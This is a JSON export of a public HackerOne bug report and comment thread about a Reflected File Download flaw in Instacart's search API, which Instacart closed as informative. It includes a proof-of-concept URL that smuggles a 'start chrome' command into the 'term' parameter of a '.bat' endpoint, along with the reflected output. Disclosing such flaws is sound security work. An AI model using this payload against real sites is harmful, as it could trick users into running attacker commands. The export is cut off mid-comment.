{"id":158505,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTg1MDU=","url":"https://hackerone.com/reports/158505","title":"Reflected File Download on recipe list search","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-08-11T16:00:44.010Z","submitted_at":"2016-08-11T16:00:44.010Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dsopas","url":"/dsopas","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":555,"url":"https://hackerone.com/instacart","handle":"instacart","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/555/df662b77c791ed1296275d032f446300e1a5a6b3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Instacart","twitter_handle":"instacart","website":"https://www.instacart.com/","about":"Same-day grocery delivery"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-10-18T01:08:16.349Z","bug_reporter_agreed_on_going_public_at":"2016-10-13T19:06:03.448Z","team_member_agreed_on_going_public_at":"2016-10-18T01:08:16.320Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi guys,\n\nRight now I'm searching for JSON issues on your API so I started to go deep into the XHR requests.\nWhen I noticed the following request:\nhttps://www.instacart.com/api/v2/searches?cart_id=3471936\u0026term=rfd\u0026page=1\u0026per=100\u0026max_per_row=7\u0026skip_other_warehouses=true\u0026disable_autocorrect=false\u0026source=web\u0026warehouse_id=129\u0026zone_id=12\n\nWhich returned the following output:\n\n{\"meta\":{\"code\":200,\"source\":\"search_service\",\"cluster\":null},\"data\":{\"term\":\"xss\",\"inventory_area_id\":617,\"items\":[],\"total_results\":0,\"aisles\":[],\"warehouses\":[],\"search_strategies\":[],\"tracking\":{},\"product_type_filter\":false,\"has_deals\":false,\"search_id\":141585110},\"pagination\":{\"total\":0,\"page\":1,\"per_page\":50}}\n\nI noticed that \"term\" parameter was reflected on the JSON format output so I tried a Reflected File Download.\n\nProof-of-concept:\nhttps://www.instacart.com/api/v2/searches.bat?cart_id=\u0026term=\"||start chrome davidsopas.com/poc/malware.htm||\u0026page=1\u0026per=100\u0026max_per_row=7\u0026skip_other_warehouses=true\u0026disable_autocorrect=false\u0026source=web\u0026warehouse_id=129\u0026zone_id=12\n\nReflecting:\n{\"meta\":{\"code\":200,\"source\":\"search_service\",\"cluster\":null},\"data\":{\"term\":\"\\\"||start chrome davidsopas.com/poc/malware.htm||\",\"inventory_area_id\":617,\"items\":[],\"total_results\":0,\"aisles\":[],\"warehouses\":[],\"search_strategies\":[\"used_or_operator\"],\"tracking\":{},\"product_type_filter\":false,\"has_deals\":false,\"search_id\":141585846},\"pagination\":{\"total\":0,\"page\":1,\"per_page\":50}}\n\nSo I got my RFD attack now (even with URL permissive), next step was to create a special crafted page to force the download:\nhttp://0xhack.com/instacart_rfd.htm\n\nNote: You need to be authenticated with a Instacart account.\n\nCheck the attached screenshots on latest versions of Chrome and Opera.\n\nSo in my proof-of-concept I was able to run a new Google Chrome window with a html file simulating a malicious file on the Windows operative system.\n\nA malicious user could:\n\n1 - Launch a malicious campaign with the specially crafted page - similar to my PoC\n2 - Victim downloads the file thinking that is from a trusted domain [instacart.com]\n3 - Malicious user gains control over victims machine\n\nThis kind of attack is very dangerous and could lead to millions of users infected by malicious campaigns. Possibility of gaining operating system access from Instacart users is a high risk of security.\n\nSolution:\nUse content-disposition header to force a filename download. Also \"term\" parameter should be encoded to prevent this kind of reflection on the output.\n\nHope it helps.\n\nBest,\nDavid Sopas\n@dsopas","vulnerability_information_html":"\u003cp\u003eHi guys,\u003c/p\u003e\n\n\u003cp\u003eRight now I\u0026#39;m searching for JSON issues on your API so I started to go deep into the XHR requests.\u003cbr\u003e\nWhen I noticed the following request:\u003cbr\u003e\n\u003ca title=\"https://www.instacart.com/api/v2/searches?cart_id=3471936\u0026amp;term=rfd\u0026amp;page=1\u0026amp;per=100\u0026amp;max_per_row=7\u0026amp;skip_other_warehouses=true\u0026amp;disable_autocorrect=false\u0026amp;source=web\u0026amp;warehouse_id=129\u0026amp;zone_id=12\" href=\"/redirect?url=https%3A%2F%2Fwww.instacart.com%2Fapi%2Fv2%2Fsearches%3Fcart_id%3D3471936%26term%3Drfd%26page%3D1%26per%3D100%26max_per_row%3D7%26skip_other_warehouses%3Dtrue%26disable_autocorrect%3Dfalse%26source%3Dweb%26warehouse_id%3D129%26zone_id%3D12\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.instacart.com/api/v2/searches?cart_id=3471936\u0026amp;term=rfd\u0026amp;page=1\u0026amp;per=100\u0026amp;max_per_row=7\u0026amp;skip_other_warehouses=true\u0026amp;disable_autocorrect=false\u0026amp;source=web\u0026amp;warehouse_id=129\u0026amp;zone_id=12\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhich returned the following output:\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;meta\u0026quot;:{\u0026quot;code\u0026quot;:200,\u0026quot;source\u0026quot;:\u0026quot;search_service\u0026quot;,\u0026quot;cluster\u0026quot;:null},\u0026quot;data\u0026quot;:{\u0026quot;term\u0026quot;:\u0026quot;xss\u0026quot;,\u0026quot;inventory_area_id\u0026quot;:617,\u0026quot;items\u0026quot;:[],\u0026quot;total_results\u0026quot;:0,\u0026quot;aisles\u0026quot;:[],\u0026quot;warehouses\u0026quot;:[],\u0026quot;search_strategies\u0026quot;:[],\u0026quot;tracking\u0026quot;:{},\u0026quot;product_type_filter\u0026quot;:false,\u0026quot;has_deals\u0026quot;:false,\u0026quot;search_id\u0026quot;:141585110},\u0026quot;pagination\u0026quot;:{\u0026quot;total\u0026quot;:0,\u0026quot;page\u0026quot;:1,\u0026quot;per_page\u0026quot;:50}}\u003c/p\u003e\n\n\u003cp\u003eI noticed that \u0026quot;term\u0026quot; parameter was reflected on the JSON format output so I tried a Reflected File Download.\u003c/p\u003e\n\n\u003cp\u003eProof-of-concept:\u003cbr\u003e\n\u003ca title=\"https://www.instacart.com/api/v2/searches.bat?cart_id=\u0026amp;term=%22%7C%7Cstart\" href=\"/redirect?url=https%3A%2F%2Fwww.instacart.com%2Fapi%2Fv2%2Fsearches.bat%3Fcart_id%3D%26term%3D%2522%257C%257Cstart\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.instacart.com/api/v2/searches.bat?cart_id=\u0026amp;term=%22%7C%7Cstart\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e chrome davidsopas.com/poc/malware.htm||\u0026amp;page=1\u0026amp;per=100\u0026amp;max_per_row=7\u0026amp;skip_other_warehouses=true\u0026amp;disable_autocorrect=false\u0026amp;source=web\u0026amp;warehouse_id=129\u0026amp;zone_id=12\u003c/p\u003e\n\n\u003cp\u003eReflecting:\u003cbr\u003e\n{\u0026quot;meta\u0026quot;:{\u0026quot;code\u0026quot;:200,\u0026quot;source\u0026quot;:\u0026quot;search_service\u0026quot;,\u0026quot;cluster\u0026quot;:null},\u0026quot;data\u0026quot;:{\u0026quot;term\u0026quot;:\u0026quot;\\\u0026quot;||start chrome davidsopas.com/poc/malware.htm||\u0026quot;,\u0026quot;inventory_area_id\u0026quot;:617,\u0026quot;items\u0026quot;:[],\u0026quot;total_results\u0026quot;:0,\u0026quot;aisles\u0026quot;:[],\u0026quot;warehouses\u0026quot;:[],\u0026quot;search_strategies\u0026quot;:[\u0026quot;used_or_operator\u0026quot;],\u0026quot;tracking\u0026quot;:{},\u0026quot;product_type_filter\u0026quot;:false,\u0026quot;has_deals\u0026quot;:false,\u0026quot;search_id\u0026quot;:141585846},\u0026quot;pagination\u0026quot;:{\u0026quot;total\u0026quot;:0,\u0026quot;page\u0026quot;:1,\u0026quot;per_page\u0026quot;:50}}\u003c/p\u003e\n\n\u003cp\u003eSo I got my RFD attack now (even with URL permissive), next step was to create a special crafted page to force the download:\u003cbr\u003e\n\u003ca title=\"http://0xhack.com/instacart_rfd.htm\" href=\"/redirect?url=http%3A%2F%2F0xhack.com%2Finstacart_rfd.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0xhack.com/instacart_rfd.htm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNote: You need to be authenticated with a Instacart account.\u003c/p\u003e\n\n\u003cp\u003eCheck the attached screenshots on latest versions of Chrome and Opera.\u003c/p\u003e\n\n\u003cp\u003eSo in my proof-of-concept I was able to run a new Google Chrome window with a html file simulating a malicious file on the Windows operative system.\u003c/p\u003e\n\n\u003cp\u003eA malicious user could:\u003c/p\u003e\n\n\u003cp\u003e1 - Launch a malicious campaign with the specially crafted page - similar to my PoC\u003cbr\u003e\n2 - Victim downloads the file thinking that is from a trusted domain [instacart.com]\u003cbr\u003e\n3 - Malicious user gains control over victims machine\u003c/p\u003e\n\n\u003cp\u003eThis kind of attack is very dangerous and could lead to millions of users infected by malicious campaigns. Possibility of gaining operating system access from Instacart users is a high risk of security.\u003c/p\u003e\n\n\u003cp\u003eSolution:\u003cbr\u003e\nUse content-disposition header to force a filename download. Also \u0026quot;term\u0026quot; parameter should be encoded to prevent this kind of reflection on the output.\u003c/p\u003e\n\n\u003cp\u003eHope it helps.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavid Sopas\u003cbr\u003e\n\u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":111452,"file_name":"instacart_rfd_opera.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/111/452/caac0293b0036666a4d065044e3cadba47a60d47/instacart_rfd_opera.jpg?response-content-disposition=attachment%3B%20filename%3D%22instacart_rfd_opera.jpg%22%3B%20filename%2A%3DUTF-8%27%27instacart_rfd_opera.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043604Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=20ccc8a39f35ea7576b73ffdf55b2c93e97802095a01ca60b71bf91006c004db","file_size":64259,"type":"image/jpeg"},{"id":111453,"file_name":"instacart_rfd_chrome.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/111/453/46ca95e0d714aa04718f9e2f6fc3a0f07a5ee57d/instacart_rfd_chrome.jpg?response-content-disposition=attachment%3B%20filename%3D%22instacart_rfd_chrome.jpg%22%3B%20filename%2A%3DUTF-8%27%27instacart_rfd_chrome.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043604Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=48e21d8684b440d42bb1f77c3db921900d7c545788d460c2a2fadc3fdf12da4c","file_size":26546,"type":"image/jpeg"}],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["dsopas","exception","spetr0x","nicktp","harrykun18"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1127898,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks @dsopas. We'll take a look and update you as soon as we have more information.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e. We\u0026#39;ll take a look and update you as soon as we have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-15T20:37:56.775Z","updated_at":"2016-08-15T20:37:56.775Z","actor":{"username":"mikeinstacart","cleared":false,"url":"/mikeinstacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1128691,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mikeinstacart thanks for the fast reply. Feel free tp contact me if you need further assistance.\n\nBest,\nDavid Sopas\n@dsopas","markdown_message":"\u003cp\u003e\u003ca href=\"/mikeinstacart\"\u003e@mikeinstacart\u003c/a\u003e thanks for the fast reply. Feel free tp contact me if you need further assistance.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavid Sopas\u003cbr\u003e\n\u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-16T06:48:00.353Z","updated_at":"2016-08-16T06:48:00.353Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1172275,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-04T08:01:25.841Z","updated_at":"2016-09-04T08:01:25.841Z","additional_data":{"duplicate_report_id":165134},"actor":{"username":"cablej","cleared":true,"url":"/cablej","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/859/7fdafea90092a305ae2cb6cec7d43461783abf0c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1173555,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you need any further assistance do let me know.\n\nBest,\nDavid Sopas\n@dsopas","markdown_message":"\u003cp\u003eIf you need any further assistance do let me know.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavid Sopas\u003cbr\u003e\n\u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-05T08:56:25.158Z","updated_at":"2016-09-05T08:56:25.158Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1237787,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-07T19:07:31.664Z","updated_at":"2016-10-07T19:07:31.664Z","additional_data":{"duplicate_report_id":174461},"actor":{"username":"a0xnirudh","cleared":false,"url":"/a0xnirudh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/891/b9be8d32dadcaa814c6bf85eceef7fdf9fa38f41_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1246505,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Hi @dsopas. I am closing this as informative. After reviewing the issue internally, we agree with Google's assessment on these types of attacks: https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download.\n\nWe appreciate the report!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e. I am closing this as informative. After reviewing the issue internally, we agree with Google\u0026#39;s assessment on these types of attacks: \u003ca title=\"https://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\" href=\"/redirect?url=https%3A%2F%2Fsites.google.com%2Fsite%2Fbughunteruniversity%2Fnonvuln%2Freflected-file-download\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://sites.google.com/site/bughunteruniversity/nonvuln/reflected-file-download\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate the report!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-13T18:45:09.087Z","updated_at":"2016-10-13T18:45:09.087Z","actor":{"username":"mikeinstacart","cleared":false,"url":"/mikeinstacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1246554,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mikeinstacart \nIn my opinion you're wrong because it something you guys can fix and prevent from happening. It can affect your users and all I did was report a security issue that will make your web application more secure.\n\nIf you still think this is something that didn't desert your time fixing I'll respect because in the end is your decision not mine.\n\nThanks for your time.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mikeinstacart\"\u003e@mikeinstacart\u003c/a\u003e \u003cbr\u003e\nIn my opinion you\u0026#39;re wrong because it something you guys can fix and prevent from happening. It can affect your users and all I did was report a security issue that will make your web application more secure.\u003c/p\u003e\n\n\u003cp\u003eIf you still think this is something that didn\u0026#39;t desert your time fixing I\u0026#39;ll respect because in the end is your decision not mine.\u003c/p\u003e\n\n\u003cp\u003eThanks for your time.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-13T19:05:48.787Z","updated_at":"2016-10-13T19:05:48.787Z","actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1246555,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-13T19:06:03.474Z","updated_at":"2016-10-13T19:06:03.474Z","first_to_agree":true,"actor":{"username":"dsopas","cleared":false,"url":"/dsopas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/486/07274fc0cd2dc05e805de2fb6c970f1c1d4341c8_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1249483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dsopas I would not say you are wrong. But whether RFD is an important problem is controversial at best.\n\nThe google assessment has some persuasive points:\n* User trusts the site hosting the link, rather than the url of the link.\n* To carry out social engineering attacks, google article showed better and simpler methods that can not be fixed by the website owner. (Why would hackers even bother looking for an RFD?)\n\nYou think we are wrong because\n\u003e \"it (is) something you guys can fix and prevent from happening.\".\n\nYes. We do agree that this is probably missing best practice. We are continuously improving our security protection, at the same time we also understand the security implication of each practice missing.  There are other endpoints that could have similar issues, if we want to add it, we may have to do it systematically, not just for single API. Fixing it is not just adding a header, it also requires confirmation of such change is working on multiple applications and platforms, which could be quite some work for a low impact problem.\n\n\u003e \"It can affect your users and all I did was report a security issue that will make your web application more secure.\"\n\nIMHO this is not true, there are easier ways to carry out similar social engineering attacks that cant be fixed (provided by google's article). Fixing it does not improve security over all (leaky bucket theory).\n\nCombining these reasons, I would consider RFD is a problem with very little impact but requires quite some work to fix.\n\nThat said, we really appreciate your detailed report! If at some point we decide to proceed adding the header (systematically of course), we will for sure find out this report and change the status to \"Resolve\". Thank you again for your time.","markdown_message":"\u003cp\u003e\u003ca href=\"/dsopas\"\u003e@dsopas\u003c/a\u003e I would not say you are wrong. But whether RFD is an important problem is controversial at best.\u003c/p\u003e\n\n\u003cp\u003eThe google assessment has some persuasive points:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eUser trusts the site hosting the link, rather than the url of the link.\u003c/li\u003e\n\u003cli\u003eTo carry out social engineering attacks, google article showed better and simpler methods that can not be fixed by the website owner. (Why would hackers even bother looking for an RFD?)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eYou think we are wrong because\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u0026quot;it (is) something you guys can fix and prevent from happening.\u0026quot;.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYes. We do agree that this is probably missing best practice. We are continuously improving our security protection, at the same time we also understand the security implication of each practice missing.  There are other endpoints that could have similar issues, if we want to add it, we may have to do it systematically, not just for single API. Fixing it is not just adding a header, it also requires confirmation of such change is working on multiple applications and platforms, which could be quite some work for a low impact problem.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u0026quot;It can affect your users and all I did was report a security issue that will make your web application more secure.\u0026quot;\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eIMHO this is not true, there are easier ways to carry out similar social engineering attacks that cant be fixed (provided by google\u0026#39;s article). Fixing it does not improve security over all (leaky bucket theory).\u003c/p\u003e\n\n\u003cp\u003eCombining these reasons, I would consider RFD is a problem with very little impact but requires quite some work to fix.\u003c/p\u003e\n\n\u003cp\u003eThat said, we really appreciate your detailed report! If at some point we decide to proceed adding the header (systematically of course), we will for sure find out this report and change the status to \u0026quot;Resolve\u0026quot;. Thank you again for your time.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-16T06:33:34.774Z","updated_at":"2016-10-16T06:41:08.474Z","actor":{"username":"cxmcc-instacart","cleared":false,"url":"/cxmcc-instacart","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"instacart","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1250415,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @cxmcc-instacart \n\nThanks for the time giving your feedack regarding your issue. \nMost of your opinion was based on Google perspective. Just to let you know that other companies like Microsoft, Yahoo!, eBay, PayPal and many others consider this to be a medium level security risk.\n\nFeel free to read if you have time:\nhttps://www.davidsopas.com/why-some-vendors-ignore-rfd-attacks/\n\nAnd the original Oren Hafif article about RFD:\nhttps://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf\nhttps://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view\n\nAgain thanks for your time.\nCan we make this report public like I requested?\n\nBest,\nDavid Sopas\n@dsopas","markdown_message":"\u003cp\u003eHi \u003ca href=\"/cxmcc-instacart\"\u003e@cxmcc-instacart\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThanks for the time giving your feedack regarding your issue. \u003cbr\u003e\nMost of your opinion was based on Google perspective. Just to let you know that other companies like Microsoft, Yahoo!, eBay, PayPal and many others consider this to be a medium level security risk.\u003c/p\u003e\n\n\u003cp\u003eFeel free to read if you have time:\u003cbr\u003e\n\u003ca title=\"https://www.davidsopas.com/why-some-vendors-ignore-rfd-attacks/\" href=\"/redirect?url=https%3A%2F%2Fwww.davidsopas.com%2Fwhy-some-vendors-ignore-rfd-attacks%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.davidsopas.com/why-some-vendors-ignore-rfd-attacks/\u003c/span\u003e\u003ci 